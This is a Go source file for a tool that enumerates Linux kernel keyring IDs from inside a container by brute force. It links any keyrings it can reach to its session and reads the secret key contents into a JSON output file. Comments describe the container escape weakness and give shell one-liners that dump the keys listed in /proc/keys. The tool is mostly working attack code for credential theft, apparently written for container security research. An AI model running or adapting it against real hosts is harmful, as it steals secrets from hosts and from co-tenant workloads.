package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/cheggaaa/pb"
)

const (
	syscall_keyctl   uintptr = 250
	syscall_add_key  uintptr = 248
	syscall_setfsgid uintptr = 123
)

const (
	keyctlGetKeyringId keyctlCommand = iota
	keyctlJoinSessionKeyring
	keyctlUpdate
	keyctlRevoke
	keyctlChown
	keyctlSetPerm
	keyctlDescribe
	keyctlClear
	keyctlLink
	keyctlUnlink
	keyctlSearch
	keyctlRead
	keyctlInstantiate
	keyctlNegate
	keyctlSetReqKeyKeyring
	keyctlSetTimeout
	keyctlAssumeAuthority
)

const (
	keySpecThreadKeyring      keyId = -1
	keySpecProcessKeyring     keyId = -2
	keySpecSessionKeyring     keyId = -3
	keySpecUserKeyring        keyId = -4
	keySpecUserSessionKeyring keyId = -5
	keySpecGroupKeyring       keyId = -6
	keySpecReqKeyAuthKey      keyId = -7
)

var debugSyscalls bool

var count int

type keyId int32
type keyctlCommand int

func (cmd keyctlCommand) String() string {
	switch cmd {
	case keyctlGetKeyringId:
		return "keyctlGetKeyringId"
	case keyctlJoinSessionKeyring:
		return "keyctlJoinSessionKeyring"
	case keyctlUpdate:
		return "keyctlUpdate"
	case keyctlRevoke:
		return "keyctlRevoke"
	case keyctlChown:
		return "keyctlChown"
	case keyctlSetPerm:
		return "keyctlSetPerm"
	case keyctlDescribe:
		return "keyctlDescribe"
	case keyctlClear:
		return "keyctlClear"
	case keyctlLink:
		return "keyctlLink"
	case keyctlUnlink:
		return "keyctlUnlink"
	case keyctlSearch:
		return "keyctlSearch"
	case keyctlRead:
		return "keyctlRead"
	case keyctlInstantiate:
		return "keyctlInstantiate"
	case keyctlNegate:
		return "keyctlNegate"
	case keyctlSetReqKeyKeyring:
		return "keyctlSetReqKeyKeyring"
	case keyctlSetTimeout:
		return "keyctlSetTimeout"
	case keyctlAssumeAuthority:
		return "keyctlAssumeAuthority"
	}
	panic("bad arg")
}

func add_key(keyType, keyDesc string, payload []byte, id int32) (int32, error) {
	var (
		err    error
		errno  syscall.Errno
		b1, b2 *byte
		r1     uintptr
		pptr   unsafe.Pointer
	)

	if b1, err = syscall.BytePtrFromString(keyType); err != nil {
		return 0, err
	}

	if b2, err = syscall.BytePtrFromString(keyDesc); err != nil {
		return 0, err
	}

	if len(payload) > 0 {
		pptr = unsafe.Pointer(&payload[0])
	}
	r1, _, errno = syscall.Syscall6(syscall_add_key,
		uintptr(unsafe.Pointer(b1)),
		uintptr(unsafe.Pointer(b2)),
		uintptr(pptr),
		uintptr(len(payload)),
		uintptr(id),
		0)

	if errno != 0 {
		err = errno
		return 0, err
	}
	return int32(r1), nil
}

func listKeys(id keyId) ([]keyId, error) {
	var (
		b1             []byte
		size, sizeRead int
	)

	bsz := 4
	b1 = make([]byte, 16*bsz)
	size = len(b1)
	sizeRead = size + 1
	for sizeRead > size {
		r1, _, errno := syscall.Syscall6(syscall_keyctl, uintptr(keyctlRead), uintptr(id), uintptr(unsafe.Pointer(&b1[0])), uintptr(size), 0, 0)
		if errno != 0 {
			return nil, errno
		}

		if sizeRead = int(r1); sizeRead > size {
			b1 = make([]byte, sizeRead)
			size = sizeRead
			sizeRead++
		} else {
			size = sizeRead
		}
	}
	keys := make([]keyId, size/bsz)
	for i := range keys {
		keys[i] = *((*keyId)(unsafe.Pointer(&b1[i*bsz])))
	}

	return keys, nil
}

// func newKeyring(id keyId) (*keyring, error) {
// 	r1, _, errno := syscall.Syscall(syscall_keyctl, uintptr(keyctlGetKeyringId), uintptr(id), uintptr(1))
// 	if errno != 0 {
// 		return nil, errno
// 	}

// 	if id >= 0 {
// 		id = keyId(r1)
// 	}
// 	return &keyring{id: id}, nil
// }

func (k Key) describeKeyId() ([]byte, error) {
	var (
		b1             []byte
		size, sizeRead int
	)

	b1 = make([]byte, 64)
	size = len(b1)
	sizeRead = size + 1
	for sizeRead > size {
		r1, _, errno := syscall.Syscall6(syscall_keyctl, uintptr(keyctlDescribe), uintptr(keyId(k.KeyId)), uintptr(unsafe.Pointer(&b1[0])), uintptr(size), 0, 0)
		if errno != 0 {
			return nil, errno
		}
		if sizeRead = int(r1); sizeRead > size {
			b1 = make([]byte, sizeRead)
			size = sizeRead
			sizeRead++
		} else {
			size = sizeRead
		}
	}

	return b1[:size-1], nil
}

func keyctl_Read(id keyId, b *byte, size int) (int32, error) {
	v1, _, errno := syscall.Syscall6(syscall_keyctl, uintptr(keyctlRead), uintptr(id), uintptr(unsafe.Pointer(b)), uintptr(size), 0, 0)
	if errno != 0 {
		return -1, errno
	}

	return int32(v1), nil
}

func keyctl_Unlink(id, ring keyId) error {
	_, _, errno := syscall.Syscall(syscall_keyctl, uintptr(keyctlUnlink), uintptr(id), uintptr(ring))
	if errno != 0 {
		return errno
	}
	return nil
}

func keyctl_Link(id, ring keyId) error {
	_, _, errno := syscall.Syscall(syscall_keyctl, uintptr(keyctlLink), uintptr(id), uintptr(ring))
	if errno != 0 {
		return errno
	}
	return nil
}

func keyctl(cmd keyctlCommand, args ...uintptr) (r1 int32, r2 int32, err error) {
	a := make([]uintptr, 6)
	l := len(args)
	if l > 5 {
		l = 5
	}
	a[0] = uintptr(cmd)
	for idx, v := range args[:l] {
		a[idx+1] = v
	}

	debugSyscalls = true
	log.Printf("%v: %v %v\n", syscall_keyctl, cmd, a[1:])

	if debugSyscalls {
		log.Printf("%v: %v %v\n", syscall_keyctl, cmd, a[1:])
	}
	v1, v2, errno := syscall.Syscall6(syscall_keyctl, a[0], a[1], a[2], a[3], a[4], a[5])
	if errno != 0 {
		err = errno
		return
	}

	r1 = int32(v1)
	r2 = int32(v2)
	return
}

func hack_main() {
	// The poitn of this is Docker masks the /proc/keys so you can't
	// see the keys that are exposed to the user. But the mask doesn't prevent
	// you from accessing the keys themselves.
	//
	// example:
	// sudo keyctl show $((16#3eed9e15))
	// Should show the hex key id of the key if you have permission to it
	// often you don't have permission but that shouldn't be docker's job
	// Her'es an example:
	//
	// sudo cat /proc/keys | awk -F " " '{print $1}' | while read line ; do ; sudo keyctl print $((16#$line)) ; done
	//
	// read in all the actual content from /proc/keys and then try to print them...
	// this works if you're root.
	// but this shows permission denied because of course you don't have permissions to the keys ala that thing.
	// sudo cat /proc/keys | awk -F " " '{print $1}' | while read line ; do ; keyctl print $((16#$line)) ; done
	// so TL;DR all kubernetes pods can read node keys and there's nothing you can do
	// explained in more detail here: https://www.projectatomic.io/blog/2014/09/yet-another-reason-containers-don-t-contain-kernel-keyrings/

	// keyid, err := listKeys(keyId(-5))
	// fmt.Println(keyid, err)
	// breturn, err := describeKeyId(keyId(914466913))
	// fmt.Println(breturn, err)

	// var secret []byte

	// kid, err := add_key(
	// 	"user",
	// 	"description",
	// 	secret,
	// 	int32(999999999),
	// )
	// fmt.Println(kid, err)

}

//TODO add the link syscalls from the library here

var max int
var min int
var keyid int
var hunt bool = true
var output_path string

func init() {

	// Optional max count
	flag.IntVar(&max, "max", 999999999, "Max key id range")
	// OPtional min count
	flag.IntVar(&min, "min", 1, "Minimum key id range")
	// optional: specific key id
	flag.IntVar(&keyid, "key", 0, "Specific key ID to test (int32)")
	flag.BoolVar(&hunt, "hunt", true, "Enable brute force mode to search for key ids (Default enabled)")
	flag.StringVar(&output_path, "output", "./keyctl_ids", "Output path")

}

func main() {
	flag.Parse()

	// Check for hunt mode or just key mode
	if keyid != 0 {
		//fmt.Println(keyid)
		k := Key{KeyId: int32(keyid)}
		key_results, err := k.describeKeyId()
		//key_results, err := describeKeyId(keyId(keyid))
		if err == nil {
			//fmt.Println(string(key_results))
			k.populate_describe(key_results)
			if k.Type == "keyring" {
				k.populate_subkeys()
			} else if k.Type == "user" {
				k.Get()
			}
		} else {
			fmt.Println(err.Error())
		}
		output, _ := json.MarshalIndent(k, "", " ")
		fmt.Println(string(output))

	} else if hunt {
		hunter()
	}

}

type Key struct {
	KeyId          int32
	Valid          bool
	Name           string
	Type           string
	Uid            string
	Gid            string
	Perms          string
	String_Content string
	Byte_Content   []byte
	Comments       []string
	Subkeys        []Key
	size           int
}

func hunter() {
	// Status bar
	bar := pb.StartNew(max)

	// Save results to file
	f, _ := os.Create(output_path)
	defer f.Close()

	// Brute force a range of keys in a container
	for i := min; i < max; i++ {
		bar.Increment()

		k := Key{KeyId: int32(i)}

		// syscall keyctl_describekeyid(keyid)
		// Collects information about a key ID but not its contents
		breturn, err := k.describeKeyId()
		if err != nil {

			if msg := err.Error(); msg == "permission denied" {
				// Permission denied means you don't possess it
				// or you don't have a UID that is permitted but
				// it confirms it exists in case you can become
				// another user
				k.Valid = true
				k.Comments = append(k.Comments, "Found key but describe permission denied")
			} else if msg := err.Error(); msg == "required key not available" {
				// Required key not available confirms it doesn't exist
				//fmt.Println("no key found here:", i)
			} else {
				// Not a lot of other errors that I know of
				fmt.Println("%d: %s", i, err.Error())
			}

		} else {
			// Means the key/keyring is accessible to us
			k.Valid = true
			// Fill in the key details based on the syscall response
			k.populate_describe(breturn)

			if k.Type == "keyring" {
				// Keyrings hold keys and are what we're looking for

				// list keys in keyring and fill in description deails
				k.populate_subkeys()

				// If you don't "possess" the keyring then you will likely
				// be unable to read its contents. This links the keyring
				// to your personal session keyring, and then tries to read
				// the contents.
				// syscall keyctl_link(src, -3=session keyring)
				err := keyctl_Link(keyId(k.KeyId), keyId(-3))
				if err == nil {
					// Try to read all the secrets of the keys
					for i := range k.Subkeys {
						err := k.Subkeys[i].Get()
						if err != nil {
							//TODO what else can happen?
							fmt.Println(err.Error())
						}

					}
					// Cleanup and unlink the keyring from your session
					keyctl_Unlink(keyId(k.KeyId), keyId(-3))
				}

			} else if k.Type == "user" {
				// We skip this because we're brute forcing the keyrings anyways so we'll
				// get the keys from there instead.
				//fmt.Println("Found a user key, skipping")
			} else if k.Type == "" {
				// I think there are some other key types or if an error...
				//fmt.Println("Type is blank")
			} else {
				// Punt if something else happens
				fmt.Println("Found another type of key I think: ", k.Type)
				continue
			}

			// Go back and collect the keyring data to be thorough
			err := k.Get()
			if err != nil {
				// We would haven't already deduced this but there's a scenario
				// where you have permission to describe() a key but not read() it
				if msg := err.Error(); msg == "permission denied" {
					k.Comments = append(k.Comments, "Read permission denied to user")
				} else if err != nil {
					// TODO not sure what other errors could be
					fmt.Println(err.Error())
				}
			}

		}

		if k.Valid {
			// Output as JSON
			output, _ := json.MarshalIndent(k, "", " ")
			// DEBUG
			//fmt.Print(string(output))
			f.Write(output)
		}
	}
	bar.Finish()
	fmt.Println("Output saved to: ", output_path)
}

func (k *Key) populate_describe(bdesc []byte) error {
	// Parse the response from the describekeyid syscall
	// In the format of:
	// 	user;1000;1000;3f1000000;myname
	k.Valid = true // TODO do I need this here?
	aReturn := strings.Split(string(bdesc), ";")

	// Populate info from results
	k.Type = aReturn[0]
	k.Uid = aReturn[1]
	k.Gid = aReturn[2]
	k.Perms = aReturn[3]
	k.Name = aReturn[4]

	// TODO not very useful results
	return nil
}

func (k *Key) populate_subkeys() (int, error) {
	// Consume a keyid and run the syscall listkeys()
	// Generates keyids for other keys part of the
	// keychain.
	nkid, err := listKeys(keyId(k.KeyId))
	if err != nil {
		return 0, err
	}
	var i int

	for _, kid := range nkid {
		// Turn it into a key object
		i++
		nk := Key{KeyId: int32(kid)}
		nkdesc, err := nk.describeKeyId()
		// TODO IDK if you need to hunt for subkeys here because
		// you're already going to find them from /proc/keys
		// and you're going to get permission problems for subkeys
		// I would assume? idk.
		if err == nil {
			//fmt.Println(nkdesc)
			nk.populate_describe(nkdesc)
			nk.populate_subkeys()
			k.Subkeys = append(k.Subkeys, nk)
		}
	}
	return i, nil
}

func (k *Key) Get() error {
	// Perform a syscall keyctlread() to get the secret bytes
	// of a key. Returns error if it can't read the key.

	var (
		b        []byte
		err      error
		sizeRead int
	)

	if k.size == 0 {
		k.size = 512
	}

	size := k.size

	b = make([]byte, int(size))
	sizeRead = size + 1
	for sizeRead > size {
		r1, err := keyctl_Read(keyId(k.KeyId), &b[0], size)
		if err != nil {
			return err
		}

		if sizeRead = int(r1); sizeRead > size {
			b = make([]byte, sizeRead)
			size = sizeRead
			sizeRead = size + 1
		} else {
			k.size = sizeRead
		}
	}

	// Update the original keypointer
	content := b[:k.size]
	k.Byte_Content = content
	k.String_Content = string(content)

	return err
}
